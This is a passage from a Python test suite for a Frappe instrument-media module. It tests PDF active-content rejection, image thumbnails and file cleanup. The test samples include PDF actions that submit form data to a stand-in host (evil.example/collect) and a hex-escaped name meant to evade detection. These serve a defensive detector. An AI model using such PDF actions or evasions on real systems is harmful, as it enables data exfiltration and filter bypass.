			"xfa": b"/AcroForm << /Fields [] /XFA (<xdp/>) >>",
			"gotor": b"/OpenAction << /S /GoToR /F (other.pdf) /D [0 /Fit] >>",
			"gotoe": b"/OpenAction << /S /GoToE /T << /R /C /N (a) >> >>",
			"submit form": b"/OpenAction << /S /SubmitForm /F (https://evil.example/collect) >>",
			"import data": b"/OpenAction << /S /ImportData /F (data.fdf) >>",
			"hex escaped name": b"/OpenAction << /S /Submit#46orm /F (https://evil.example/collect) >>",
			"hex escaped key": b"/Names << /Embedded#46iles << /Names [] >> >>",
		}
		for label, extra in blocked.items():
			with self.subTest(label=label):
				self.assertTrue(media.pdf_has_active_content(_pdf_build(0, _catalog(extra))))
		# đối tượng nằm trong object stream (PDF 1.5, xref stream) cũng được duyệt
		self.assertFalse(media.pdf_has_active_content(_pdf_objstm(b"<< /Type /Catalog /Pages 1 0 R >>")))
		self.assertTrue(
			media.pdf_has_active_content(
				_pdf_objstm(b"<< /Type /Catalog /Pages 1 0 R /AcroForm << /Fields [] /XFA (x) >> >>")
			)
		)
		self.assertTrue(
			media.pdf_has_active_content(
				_pdf_objstm(b"<< /Type /Catalog /Pages 1 0 R /OpenAction << /S /JavaScript /JS (x) >> >>")
			)
		)
		# PDF sạch và liên kết web (/URI, IFU thật hay có) vẫn nhận
		self.assertFalse(media.pdf_has_active_content(_pdf()))
		self.assertFalse(
			media.pdf_has_active_content(
				_pdf_build(0, _catalog(b"/OpenAction << /S /URI /URI (https://www.example.com/ifu) >>"))
			)
		)
		# tải lên: PDF có file nhúng bị từ chối, PDF sạch trong object stream được nhận
		make_instrument("MD-PDFKEYS")
		embedded = _pdf_build(0, _catalog(blocked["embedded files"]))
		self.assertRejected("MD-PDFKEYS", "ifu", embedded, "embedded.bin", "embedded files")
		clean = attach_instrument_file(
			"MD-PDFKEYS", "ifu", _pdf_objstm(b"<< /Type /Catalog /Pages 1 0 R >>"), "clean15.pdf"
		)
		self.assertTrue(_set_media("MD-PDFKEYS", ifu=clean.file_url).ifu)

	def _thumbnail_of(self, code, content, file_name):
		make_instrument(code)
		source = attach_instrument_file(code, "image", content, file_name)
		doc = _set_media(code, image=source.file_url)
		self.assertTrue(doc.image_thumbnail, msg=code)
		thumb = Image.open(frappe.get_doc("File", {"file_url": doc.image_thumbnail}).get_full_path())
		self.assertEqual((thumb.format, thumb.mode), ("JPEG", "RGB"))
		return thumb

	def test_thumbnail_from_16bit_cmyk_and_palette_images(self):
		# Review minor: PNG xám 16 bit (I;16), JPEG CMYK, PNG bảng màu có trong suốt đều ra thumbnail đúng màu
		buffer = io.BytesIO()
		Image.new("I;16", (400, 300), 32768).save(buffer, format="PNG")
		self.assertEqual(Image.open(io.BytesIO(buffer.getvalue())).mode, "I;16")
		gray = self._thumbnail_of("MD-I16", buffer.getvalue(), "gray16.png")
		self.assertEqual(gray.size, (320, 240))
		self.assertTrue(
			all(100 < value < 160 for value in gray.getpixel((160, 120))), msg=gray.getpixel((160, 120))
		)

		buffer = io.BytesIO()
		Image.new("CMYK", (400, 300), (0, 255, 255, 0)).save(buffer, format="JPEG")
		self.assertEqual(Image.open(io.BytesIO(buffer.getvalue())).mode, "CMYK")
		cmyk = self._thumbnail_of("MD-CMYK", buffer.getvalue(), "cmyk.jpg")
		red, green, blue = cmyk.getpixel((160, 120))
		self.assertGreater(red, 200)
		self.assertLess(max(green, blue), 80)

		palette = Image.new("P", (400, 300), 0)
		palette.putpalette([0, 0, 0, 220, 20, 20] + [0] * 762)
		palette.paste(1, (0, 0, 200, 300))
		buffer = io.BytesIO()
		palette.save(buffer, format="PNG", transparency=0)
		self.assertEqual(Image.open(io.BytesIO(buffer.getvalue())).mode, "P")
		thumb = self._thumbnail_of("MD-PAL", buffer.getvalue(), "palette.png")
		self.assertGreater(min(thumb.getpixel((240, 120))), 240)  # chỉ số trong suốt thành nền trắng
		self.assertGreater(thumb.getpixel((60, 120))[0], 180)

	def test_old_thumbnail_file_removed_when_image_changes(self):
		# Review minor: thumbnail cũ không còn ai dùng → xóa bản ghi File; blob xóa sau khi commit (rollback giữ nguyên)
		make_instrument("MD-ORPHAN")
		first = attach_instrument_file("MD-ORPHAN", "image", _image("PNG", color=(1, 100, 1)), "a.png")
		doc = _set_media("MD-ORPHAN", image=first.file_url)
		old_url = doc.image_thumbnail
		old_row = frappe.db.get_value("File", {"file_url": old_url}, "name")
		old_path = frappe.get_doc("File", old_row).get_full_path()
		second = attach_instrument_file("MD-ORPHAN", "image", _image("PNG", color=(1, 1, 100)), "b.png")
		doc = _set_media("MD-ORPHAN", image=second.file_url)
		self.assertNotEqual(doc.image_thumbnail, old_url)
		self.assertFalse(frappe.db.exists("File", old_row))
		self.assertTrue(os.path.exists(old_path))  # chưa commit: blob còn để rollback không làm hỏng
		frappe.db.after_commit.run()
		self.assertFalse(os.path.exists(old_path))
		# Audit: lần đổi thumbnail vẫn được ghi trong Audit Log của dụng cụ
		self.assertTrue(
			frappe.db.exists(
				"Audit Log", {"ref_doctype": "Instrument", "ref_name": "MD-ORPHAN", "action": "Update"}
			)
		)
		# xóa ảnh: thumbnail hiện tại cũng thành mồ côi và bị xóa
		current_row = frappe.db.get_value("File", {"file_url": doc.image_thumbnail}, "name")
		doc = _set_media("MD-ORPHAN", image=None)
		self.assertFalse(frappe.db.exists("File", current_row))

	def test_force_private_never_leaves_public_blob(self):
		# Review minor: ghi lại vào private lỗi giữa chừng cũng không để lại bản công khai mồ côi
		make_instrument("MD-PUBORPHAN")
		real_save_file = File.save_file
		calls = []

		def flaky_save_file(self, *args, **kwargs):
			calls.append(self.is_private)
			if len(calls) == 2:
				raise OSError("disk full")
			return real_save_file(self, *args, **kwargs)

		content = _image("PNG", color=(3, 33, 133))
		public_dir = frappe.get_site_path("public", "files")
		before = set(os.listdir(public_dir))
		with patch.object(File, "save_file", flaky_save_file):
			with self.assertRaises(OSError):
				_file_doc("MD-PUBORPHAN", "image", content, "pub.png", is_private=0).insert()
		self.assertEqual(calls, [0, 1])
		self.assertEqual(set(os.listdir(public_dir)) - before, set())

	def test_legacy_public_file_stays_saveable_and_can_be_made_private(self):
		# Review minor: File công khai trước FEAT-014 đính vào Instrument.image lưu lại được, chuyển riêng tư được
		make_instrument("MD-LEGACY")
		legacy = _loose_file(_image("PNG", color=(5, 50, 150)), "legacy.png", is_private=0)
		self.assertTrue(legacy.file_url.startswith("/files/"), msg=legacy.file_url)
		frappe.db.set_value(
			"File", legacy.name, {**ATTACH_IMAGE, "attached_to_name": "MD-LEGACY"}, update_modified=False
		)
		frappe.db.set_value("Instrument", "MD-LEGACY", "image", legacy.file_url)
		doc = frappe.get_doc("File", legacy.name)
		doc.save()  # lưu không đổi gì
		self.assertEqual(_set_media("MD-LEGACY", model="L1").image, legacy.file_url)
		doc = frappe.get_doc("File", legacy.name)
		doc.is_private = 1
		doc.save()
		self.assertTrue(doc.file_url.startswith("/private/files/"), msg=doc.file_url)
		self.assertEqual(frappe.db.get_value("Instrument", "MD-LEGACY", "image"), doc.file_url)
		# rollback cuối lớp test trả blob về thư mục công khai (Frappe on_rollback): dọn để không sót file trên đĩa
		public_path = frappe.get_site_path("public", "files", os.path.basename(doc.file_url))
		frappe.db.after_rollback.add(lambda: os.path.isfile(public_path) and os.remove(public_path))
